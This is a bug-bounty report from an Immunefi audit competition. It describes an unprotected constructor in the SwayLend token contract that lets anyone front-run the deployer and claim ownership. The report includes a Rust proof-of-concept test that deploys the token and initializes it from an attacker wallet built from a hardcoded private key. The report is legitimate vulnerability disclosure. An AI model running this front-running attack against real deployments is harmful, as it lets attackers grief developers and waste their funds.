# #35853 \[SC-Medium] permissonless constructor always for front-running owner initialization.

**Submitted on Oct 10th 2024 at 20:41:19 UTC by @SeveritySquad for** [**IOP | Swaylend**](https://immunefi.com/audit-competition/iop-swaylend)

* **Report ID:** #35853
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/Swaylend/swaylend-monorepo/blob/develop/contracts/src-20/src/main.sw>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Theft of gas

## Description

## Brief/Intro

The constructor of the SwayLend token allows anyone to front-run the real deployer of the contract and initialize themselves as the owner; this can lead to griefing and gas waste.

## Vulnerability Details

On the call to the \`constructor()\` anyone can initialize themselves as the owner, causing subsequent calls to fail, forcing the deployers to always have to re-deploy the token, this will lead to waste of gas and griefing. \`\`\`rust fn constructor(owner\_: Identity) { require( storage .owner .read() == State::Uninitialized, "owner-initialized", ); storage.owner.write(State::Initialized(owner\_)); } \`\`\`

## Mitigation

It is best to set the owner as configurable since there is no way to transfer ownership.

## References

* <https://github.com/Swaylend/swaylend-monorepo/blob/9132747331188b86dd8cbf9a1ca37b811d08dddb/contracts/src-20/src/main.sw#L41C1-L50C6>

## Proof of Concept

## Proof of Concept

Add to contracts/src-20/scripts/deploy.rs to test.

\`\`\`rust #\[tokio::test] #\[should\_panic] async fn front\_run\_initialization() { use fuels::crypto::SecretKey; dotenv().ok();

```
// setup fuel provider
let rpc &#x3D; std::env::var(&quot;RPC&quot;).unwrap();
let provider &#x3D; Provider::connect(rpc).await.unwrap();

// setup wallet
let secret &#x3D; std::env::var(&quot;SECRET&quot;).unwrap();
// let private_key: SecretKey &#x3D; &quot;6d39e7ec67f1414e804a52e33989d7162c18084f47e05fdbd04a2b653dc05391&quot;.parse().unwrap();

// let attacker: WalletUnlocked &#x3D; WalletUnlocked::new_from_private_key(private_key, Some(provider.clone()));

let wallet: WalletUnlocked &#x3D;
    WalletUnlocked::new_from_private_key(secret.parse().unwrap(), Some(provider.clone()));

// deploy token
let configurables &#x3D; TokenConfigurables::default();
let root &#x3D; PathBuf::from(env!(&quot;CARGO_WORKSPACE_DIR&quot;));
let bin_path &#x3D; root.join(&quot;contracts/src-20/out/debug/src-20.bin&quot;);
let config &#x3D; LoadConfiguration::default().with_configurables(configurables);

let mut rng &#x3D; rand::thread_rng();
let salt &#x3D; rng.gen::&lt;[u8; 32]&gt;();

let id &#x3D; Contract::load_from(bin_path, config)
    .unwrap()
    .with_salt(salt)
    .deploy(&amp;wallet, TxPolicies::default())
    .await
    .unwrap();
let instance &#x3D; Token::new(id.clone(), wallet.clone());

let private_key: SecretKey &#x3D; &quot;6d39e7ec67f1414e804a52e33989d7162c18084f47e05fdbd04a2b653dc05391&quot;
    .parse()
    .unwrap();
let attacker: WalletUnlocked &#x3D;
    WalletUnlocked::new_from_private_key(private_key, Some(provider.clone()));

// simulate an attacker frontrunning the owners call to constructor.
instance
    .clone()
    .with_account(attacker.clone())
    .methods()
    .constructor(wallet.address().into())
    .call()
    .await
    .unwrap();
// on the call to contructor by owner, the call will always fail.
instance
    .methods()
    .constructor(wallet.address().into())
    .call()
    .await
    .unwrap();
```

} \`\`\`
